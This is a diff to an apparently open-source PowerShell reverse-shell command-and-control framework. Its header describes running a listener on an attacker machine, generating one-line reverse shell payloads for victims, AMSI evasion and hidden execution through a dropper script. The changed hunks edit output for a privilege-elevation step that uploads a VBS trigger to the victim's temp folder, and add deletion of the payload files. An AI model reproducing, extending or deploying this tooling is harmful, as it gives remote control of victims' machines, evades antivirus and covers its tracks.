@@ -6,7 +6,7 @@
    ReverseTCPShell - Framework. This PS1 starts a listener Server on a Windows attacker machine and generate oneline revshell
    payloads for CMD and PS to be executed on the victim machine. You can use the generated oneline revshell payload also via
    netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files). If this
-   framework is executed using venom v1.0.16 framework {amsi evasion n�4} then linux users will not lost C2 functionalities
+   framework is executed using venom v1.0.16 framework {amsi evasion nº4} then linux users will not lost C2 functionalities
    and the target connection terminal window will be executed hidden with the help of dropper.bat script.
 
 .EXECUTION:
@@ -181,7 +181,7 @@ $Modules = @"
 Clear-Host;
 Write-Host $Modules;
 ## Venom v1.0.16 function
-# Auto-Venom-Settings {Agent nº 5}
+# Auto-Venom-Settings {Agent nÂº 5}
 $DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
 If($DISTRO_OS)
 {
@@ -826,10 +826,10 @@ While($Client.Connected)
             ((Get-Content -Path $trigger_File -Raw) -Replace "120000","$Delay_Time")|Set-Content -Path $trigger_File;
             write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
             Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
-            Write-Host "   ------   ----------            ------";
+            Write-Host "   ------   -----------           -----";
             Write-Host "   Upload   `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
             Write-Host "   [i] Exit|Restart meterpeter (use same ip|port|obfuscation)" -ForeGroundColor yellow;
-            Write-Host "   [i] to recive the elevated Connection back in xx seconds." -ForeGroundColor yellow;
+            Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;
             ## Write Local script (trigger.vbs) to Remote-Host $env:tmp
             $FileBytes = [io.file]::ReadAllBytes("$trigger_File") -join ',';
             $FileBytes = "($FileBytes)";
@@ -1460,6 +1460,10 @@ While($Client.Connected)
         Start-Sleep -Seconds 2;
         write-host " [i] Deleted: '$env:LocalAppData\webroot\'" -ForegroundColor Yellow;
         cmd /R rmdir /Q /S "%LocalAppData%\webroot\";
+        $bath = "$IPATH"+"WStore.vbs";
+        $bathtwo = "$IPATH"+"$payload_name.ps1";
+        cmd /R del /Q /F "$bath";
+        cmd /R del /Q /F "$bathtwo";
       }
       Start-Sleep -Seconds 3;
       $Socket.Stop();
